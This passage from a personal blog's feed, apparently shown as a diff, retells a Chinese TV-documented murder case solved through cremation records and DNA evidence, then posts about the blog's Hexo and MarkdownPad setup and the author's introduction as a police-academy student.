</p><p>王希元心理变态，要求别人杀人，甚至杀不相干的人；韩宝山也是心狠手辣，自己老乡都能下得去手；韩本立来当杀手，结果自己被杀死，这一圈人，真是没一个无辜的。</p><p>韩宝山杀了韩本立，和王希元一起拿小车把尸体抛到机井，两人共同作案，之后韩宝山就逃回了天津。</p><p><strong><strong>案件就此告破</strong></strong>！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAPbIHgmUXfYQ1Tib5ktWaPowGM9g99BuFMxQNhzQgFZ1bfzRiaWpDIJvQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>看到这里，就可以结案了，死者身份确定，凶手身份确定，一切都清清楚楚了。</p><p>只要再抓到潜逃的王希元，就大功告成了。</p><p>但是！</p><p><strong><strong>王希元就是抓不到</strong></strong>！</p><p>他的家人，他的亲戚，他的朋友全无联系，他的身份证再没有被使用过，他的银行户口一毛钱都没动过……</p><p>整整2年过去，王希元一点生活痕迹也没有。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAFKabyKSIictLAnxLfwccWDd1STht1wIibua9MHHSPngyQ4XTB88gAKew/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtABbh0uMRo1YvFyiaMnH56tsE30VmKJG0ONup9tWXRW5p8896qDicKXGIQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>警方注意到一点点<strong><strong>不寻常的痕迹</strong></strong>是，王希元在失踪后曾经给村民群发过短信，说自己去躲债了。</p><p>他群发给大家说“兄弟”，可是他还发给了爷爷叔叔辈的乡亲，在商河孙集乡，辈分是很被看重的，王希元这样给长辈发短信，很是奇怪。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAwAPX9V5Vg37nnGtRSbLHKbK7NPUOMWUH4vI5XVCVe2uqPmLPKHkeag/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>于是警方有一个结论：<strong><strong>王希元死了</strong></strong>。</p><p>一个活着的人，是不会没有任何生活痕迹的，他们见过很多逃犯，都会偷偷用钱或者联系家人，但是王希元没有，加上这条古怪的短信，只有一个可能性，他死了。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtApWibcwIzEKKGW8wzlMGIKwXxloWDATfiaibWD8suZloKOApEwlic0L40XA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>他们又去审讯了韩宝山，因为他杀了一个人，很有可能把王希元也杀死了，但是韩宝山抵死不认，坚决否认，说自己杀了韩本立就回天津，绝对没有再杀人。</p><p>所以，现在警方面对的情况是：</p><p><strong><strong>没有尸体，没有凶手</strong></strong>。</p><p>但却高度怀疑，有一个人死了。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAYCOFM7JXsZNOo5Rq6zy9cOdicbY4n6RgRD2QVs8C0hbFlibktM8Q1gCg/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>已经过了两年了，证据是肯定都没有了，只有走访村民的口供，警方不断的走访，都已经让村民疲倦，自己也尴尬。</p><p>但他们还是得到了一个线索：王希元最后一次有人看见，是大雾加小雪的天气。</p><p>这一天，是2010年3月9号。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtABL74gbHNiauicA80LQngcrGfCNzlNxhxgcQoCRw5U1mHZqdAYIabibZ5g/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>韩宝山便排除了嫌疑，他那时已经和王希元没有联系，也没有回到山东。</p><p>那么，是谁杀死了王希元？</p><p><strong><strong>他真的死了吗？</strong></strong></p><p>警方找不到线索，离王希元消失过了两年，他们还是找不到凶手，也找不到王希元。</p><p>在我们普通人观念里，王希元这么坏，他肯定是逃走了，要找一个逃走的人是很难的，案件估计就闲置了。</p><p>但是警方还是在开会，反复讨论案件。</p><p>在他们一次开会中，一位警员说到他们当初查找王希元时，也走访了他买凶杀人的对象<strong><strong>张本岭</strong></strong>，张本岭知道王希元找人暗杀他，对他们的暗杀方式很看不上，什么抛尸到机井，觉得太笨了。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAzKic7QBeibsjH6ibbZALGZFtE1B11D50zJoqEtyUmNZGjKNyOXo33x3qw/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAeo7iar067DvcBsjYibUXjyiaMr1OMCIacpQRvGLbU8AY9eav5iaxbg15Ag/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>张本岭说了一句话：我要作案的话，我就把他给烧掉。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA2akfe3wA6ichcbokvxHx9MLwB5sNNzBc2aR0fwTPtdUia3FCfN9ibfyWA/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>刑侦大队长听到这个细节，马上就心里一动。</p><p>真·路人是不会想到什么杀人手法的，张本岭是不是说了实话？</p><p>然后他们开始查张本岭！</p><p>张本岭是职业是经营殡葬事业，花圈、寿衣，包括送尸体到殡仪馆火化。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA2zqzmDkicqPHnYBNibttAEY8XIsDoz7ZWg6bR7TOokdeO7ibVylYbpHmg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAdo5ZNRLaLek94g2EEXpKJ33QdjS9WQTFnNLb1tQQnA0icTDvkmZmuEA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>张本岭在他们的判断中，是受害人的身份，怎么会反过来杀人？</p><p>但是王希元恨他恨到要杀死他，他对王希元，难道不恨？</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAc8NggJaOP7iaibhU0FhDEqechQxuMXYYeJ6MLUY0ibiad74Sicr5vVMOArQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>于是警方推开了新思路大门：<strong><strong>受害人可能是加害人</strong></strong>！</p><p>张本岭有可能也恨王希元，被他暗害多次，于是反过来杀了他，并且利用自己的职业方便，把他拉去殡仪馆火化烧掉，毁尸灭迹！</p><p>这个猜想，让警方又有了追查的方向。</p><p>可是他们很快就遇到了最大的难题：</p><p><strong><strong>没有证据</strong></strong>。</p><p>国家对火化程序控制很严格，非正常死亡需要公安局开证明，自然死亡的人员也需要村委会开具证明才能火化。</p><p>在3月9日，王希元失踪的前后十天，当地殡仪馆火化的每一具尸体，都是开了证明的真实的人。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA0vGvj0K0dnI2zarU8FgW7TGj0nuTKY7thRRF3DJ5cCGZz2rg2RV06g/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>他们扩大了范围，发现原来张本岭并不是在当地，而是在周边，一共火化了5个人，并且出具了5个火化证明，死亡证明，手续完备。</p><p>这是“<strong><strong>完美不在场证明</strong></strong>”。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA5lfuyBBpXFIdq6X44n9cC7EJKPq4CyO7ibtIQiabNwlVicQI5jQgicrM2Q/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAibfIku2DPHMg9KRficZbcWiaKOg5TqDKkGZOqBQTiauUvicfJrBBibITSu7w/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>可张本岭真的是很符合杀死王希元的嫌疑人，警方并没有就此放弃，继续沿着张本岭查下去，他们连夜回到殡仪馆，查了张本岭十年内送来火化的名单。</p><p>终于发现了<strong><strong>关键性证据</strong></strong>！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAreBx646SCaCRkUHwa1Hj5JBVc9VgZqiateuZFqYiaUR0a1qTes0suPdA/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>张本岭在2008年送去火化的一位丁姓老人，名字出现在他3月9日送到邻县火化的名单中。</p><p>一个人，<strong><strong>被火化了两次</strong></strong>！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAsDZibKcEz25s1XPe6SYlyPyvCJ1nbInKdLGVDphTKHyZtJl9z94tcIA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtALdkg7YG3L3zDEk7sOJt8W73rm0ZNLzhdMOMSGV3I23PabkMKQF6ckg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA82zw5BaROTakqgyNN9rgxiakWuhSL3nLicXAuzGsrXxK8E7bR8m77nIw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAJ1IiaxPGuSVo38jr99xl7bfOUN0VeTH6gu929ykP7ibvQvf8HsCAFx8Q/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAzACI2Ekw8IbA5dDjxLFbsmib2PZ37OXhPVy1eibZIrKnphx4WicTUSlCA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAmGTwMib2X9o4VSIvgIXPmSvtheXHibTDe5UKricAVI1lnKpibVCoics7S2A/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAjdY4OEt0shBeicZECe6nibrbVGmQjutACJpFakiauudjP3btibcZaWwZ6A/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>这下张本岭的嫌疑非常大了，他送去火化的人，警方猜测肯定是王希元。</p><p>可问题是，王希元如果真被火化了，那死无对证，如果张本岭死不承认，这事情也很难给张本岭定罪。</p><p>他火化的人，和失踪的人，如何证明是同一个人？</p><p>谁又能保证他火化的是王希元？</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtACeZ3JkXuhGbXLAM2qEajNMZVSPfATDwfu192xnTXAvTNuzaiaSxJeMA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>这就是大家都已经确定他有问题，是最可能犯案的人，但是没有证据，不符合法律程序，就没办法定罪。</p><p>还需要他和王希元之间更多的联系证据。</p><p>事情在哪里发了转机呢？</p><p>警方和张本岭的老婆张红霞套话，问他们家有什么不一样，他老婆被套出，家里沙发椅子的<strong><strong>座垫</strong></strong>不见了。</p><p>于是警方又到张本岭家去检验他的沙发椅子，有了重大发现：</p><p>沙发椅后面的木条，有血迹。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtADX0sma7xcoiaicA8V2aeC39iaLhC9CrqYQJEYqibnXF2rdKnG98NVoYFibA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>DNA对比后发现果然是<strong><strong>王希元的血迹</strong></strong>，张本岭家，就是第一案发现场！</p><p>现在证据确凿，在警方的审讯下，张本岭终于交待了作案事实。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAPuR5BQkvh5XDqbMfxgVQShOTyvVNq18eWCrIHPVw3zsmrADeaMsGxQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>原来他的老婆张红霞和王希元一直在<strong><strong>偷情</strong></strong>，他们两个为了在一起，<strong><strong>雇凶</strong></strong>杀张本岭，结果没杀死张本岭，去让杀手自相残杀。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAJQQdiaheP55rTj48SeBMM1bhJCLibPM8jicx6Hb6pxZDePsZZjJp31Fog/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>张本岭知道他们在一起，于是找了王希元来家里，最后争吵中杀死了王希元，伙同自己的朋友李文西把王希元抬到火化车上，他利用<strong><strong>当地开具死亡证明的漏洞</strong></strong>，去搞了空白的死亡证明，顺利的火化了王希元，毁尸灭迹！</p><p>所以看似受害人的他，竟然是凶手。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA3NZDuv61OapMM8f5gekMuDpYqCvg9sMiaqLzXkXdeZgSriahqNicdXsOQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtATyrqa3nEwEsvQjKxJqU8G1Hu5Wj9xjnB3DnScB0qMial5x2gFnJ3s3g/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA2zOXdzb66olnbC3jubriaic2CX3OeAiaplubk2eoJk7Qic4Fg84J21HUxw/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>最后韩宝山被判死缓，张红霞判刑11年，当地开死亡证明的漏洞，也被补上。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA8TjEb4JoXfpzKRsNDD7HV1eKGJ4DuqYb25UGP8mfz4L3Q2XfsSrp0w/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>这个连环杀人案两年告破，从无名男尸到杀手，从买凶杀人到自己被害，真的是曲折离奇，频频遇到案件卡住。</p><p>可某个环节进行不下去，警方都能从另一个角度侦破，不放过细节，终于找到真相。</p><p>每一次案件进入死路，每一次大胆的猜测，都非常令人惊叹！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAoBibYDO4fUMyYlulrU14JBtiaGoWGVjddMSbA5iaBzts06sWI8S7xmuyA/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>我在《今日说法》结束后，专门去看了法院的判决书，发现张本岭开始有狡辩，张本岭说王希元进门拿“喷雾”喷他，然后他就神志不清了，等他清醒，王希元就死了，自己手里拿着木棍……</p><p>2014年4月，张本岭一案开庭，他被判无期徒刑，同伙李文西判9年。</p><p>王家和张本岭索赔30万，最后得到了2万的赔偿。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAMGcKCeBhnLHHNP6hxxrO3WDpCLYkYgs3fswO1gnjibpmIBPfOCQMrTg/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtARgpdHYhKJG0YeAXeGxyKVPKnsSvI77Lt7XAxofQgyY2jPffcicB8ZWA/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>————————————————————</p><p>这个故事里没有一个是好人，也没有人无辜，但是能复杂成这样，相当罕见，警方能侦破，法网恢恢，疏而不漏，更是值得敬佩。</p><p>希望这个案件能被拍成电影或者电视剧，让段奕宏张译这样是实力派来演，毕竟案情实在太曲折了，太离奇了。</p><p>其中张本岭的心态真是稳，明明自己是真凶，却能在警方多次询问保持镇定，毫无破绽。</p><p>警方队长在最初找不到死者身份，到后期连死者都找不到，居然能破案，让人惊叹！</p><p>最后，从案件得出结论，婚外恋劈腿风险高，触犯法律更完蛋，螳螂捕蝉黄雀在后，逼急了谁都可以当坏人。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;###原创 2017-11-19 李铃铛 大李吃西瓜###&lt;br&gt;周末愉快~今天我们这里降温了，冷的不行，在全国各地的大家也注意防寒保暖，健健康康！&lt;br&gt;今天来818《今日说法》里我感觉最悬疑最复杂的一案，每次想到都觉得心中一紧，在破案的警方看来，也是他们一生中很难遇到的案件。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://i1.bvimg.com/620384/e46ff774472b0e56.png&quot; alt=&quot;&quot;&gt;  &lt;/p&gt;
-&lt;p&gt;就是这部：&lt;/p&gt;
-&lt;center&gt;&lt;font color=&quot;#B22222&quot; size=&quot;5&quot; face=&quot;黑体&quot;&gt;《烟锁殡仪馆》&lt;/font&gt;&lt;/center&gt;
-    
-    </summary>
-    
-    
-      <category term="警察" scheme="http://yoursite.com/tags/%E8%AD%A6%E5%AF%9F/"/>
-    
-      <category term="摘录" scheme="http://yoursite.com/tags/%E6%91%98%E5%BD%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>博客环境</title>
-    <link href="http://yoursite.com/2017/11/20/hexo-environment/"/>
-    <id>http://yoursite.com/2017/11/20/hexo-environment/</id>
-    <published>2017-11-20T12:29:28.000Z</published>
-    <updated>2017-11-25T17:06:52.420Z</updated>
-    
-    <content type="html"><![CDATA[<ul><li>blog使用的环境是git+nodejs+<strong><strong>Hexo</strong></strong>+github,至于为什么用hexo还不是因为穷。</li></ul><p><img src="http://ww1.rs.fanjian.net/c/ca/72/2d/55caa1800872a8677e2dd43c4be4b58f.jpg" alt="">  </p><p>我的网址是ppsuc.github.io让我有点惶恐,我也不知道为什么当初注册的github账户名是这个，希望以后的师弟搜github闲着无聊试着搜学校的时候却搜到一个莫名其妙的用户的时候不要打我2333，hexo主题是yilia,地址在</p><blockquote><p><a href="https://github.com/litten/hexo-theme-yilia" target="_blank" rel="noopener">https://github.com/litten/hexo-theme-yilia</a>  </p></blockquote><ul><li>markdown编辑器用的软件是<strong><strong>MarkdownPAd</strong></strong>，个人觉得灰常好用，输入code处理上面不是特别给力，无伤大雅</li></ul><a id="more"></a><p><strong>ps:贴一下MarkdownPad的语法文档</strong></p><h2 id="Welcome-to-MarkdownPad-2"><a href="#Welcome-to-MarkdownPad-2" class="headerlink" title="Welcome to MarkdownPad 2"></a>Welcome to MarkdownPad 2</h2><p><strong>MarkdownPad</strong> is a full-featured Markdown editor for Windows.</p><h3 id="Built-exclusively-for-Markdown"><a href="#Built-exclusively-for-Markdown" class="headerlink" title="Built exclusively for Markdown"></a>Built exclusively for Markdown</h3><p>Enjoy first-class Markdown support with easy access to  Markdown syntax and convenient keyboard shortcuts.</p><p>Give them a try:</p><ul><li><strong>Bold</strong> (<code>Ctrl+B</code>) and <em>Italic</em> (<code>Ctrl+I</code>)</li><li>Quotes (<code>Ctrl+Q</code>)</li><li>Code blocks (<code>Ctrl+K</code>)</li><li>Headings 1, 2, 3 (<code>Ctrl+1</code>, <code>Ctrl+2</code>, <code>Ctrl+3</code>)</li><li>Lists (<code>Ctrl+U</code> and <code>Ctrl+Shift+O</code>)</li></ul><h3 id="See-your-changes-instantly-with-LivePreview"><a href="#See-your-changes-instantly-with-LivePreview" class="headerlink" title="See your changes instantly with LivePreview"></a>See your changes instantly with LivePreview</h3><p>Don’t guess if your <a href="http://markdownpad.com" target="_blank" rel="noopener">hyperlink syntax</a> is correct; LivePreview will show you exactly what your document looks like every time you press a key.</p><h3 id="Make-it-your-own"><a href="#Make-it-your-own" class="headerlink" title="Make it your own"></a>Make it your own</h3><p>Fonts, color schemes, layouts and stylesheets are all 100% customizable so you can turn MarkdownPad into your perfect editor.</p><h3 id="A-robust-editor-for-advanced-Markdown-users"><a href="#A-robust-editor-for-advanced-Markdown-users" class="headerlink" title="A robust editor for advanced Markdown users"></a>A robust editor for advanced Markdown users</h3><p>MarkdownPad supports multiple Markdown processing engines, including standard Markdown, Markdown Extra (with Table support) and GitHub Flavored Markdown.</p><p>With a tabbed document interface, PDF export, a built-in image uploader, session management, spell check, auto-save, syntax highlighting and a built-in CSS management interface, there’s no limit to what you can do with MarkdownPad.</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;ul&gt;
-&lt;li&gt;blog使用的环境是git+nodejs+&lt;strong&gt;&lt;strong&gt;Hexo&lt;/strong&gt;&lt;/strong&gt;+github,至于为什么用hexo还不是因为穷。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&quot;http://ww1.rs.fanjian.net/c/ca/72/2d/55caa1800872a8677e2dd43c4be4b58f.jpg&quot; alt=&quot;&quot;&gt;  &lt;/p&gt;
-&lt;p&gt;我的网址是ppsuc.github.io让我有点惶恐,我也不知道为什么当初注册的github账户名是这个，希望以后的师弟搜github闲着无聊试着搜学校的时候却搜到一个莫名其妙的用户的时候不要打我2333，hexo主题是yilia,地址在&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&quot;https://github.com/litten/hexo-theme-yilia&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/litten/hexo-theme-yilia&lt;/a&gt;  &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ul&gt;
-&lt;li&gt;markdown编辑器用的软件是&lt;strong&gt;&lt;strong&gt;MarkdownPAd&lt;/strong&gt;&lt;/strong&gt;，个人觉得灰常好用，输入code处理上面不是特别给力，无伤大雅&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
-    
-      <category term="胡言乱语" scheme="http://yoursite.com/tags/%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>今天开始写博客</title>
-    <link href="http://yoursite.com/2017/11/20/blog-start/"/>
-    <id>http://yoursite.com/2017/11/20/blog-start/</id>
-    <published>2017-11-20T12:20:20.000Z</published>
-    <updated>2017-12-18T16:21:17.688Z</updated>
-    
-    <content type="html"><![CDATA[<p>Vicen，大三在读警校生一枚，多多指教~~~</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;Vicen，大三在读警校生一枚，多多指教~~~&lt;/p&gt;
-
-      
-    
-    </summary>
-    
     
   </entry>
   
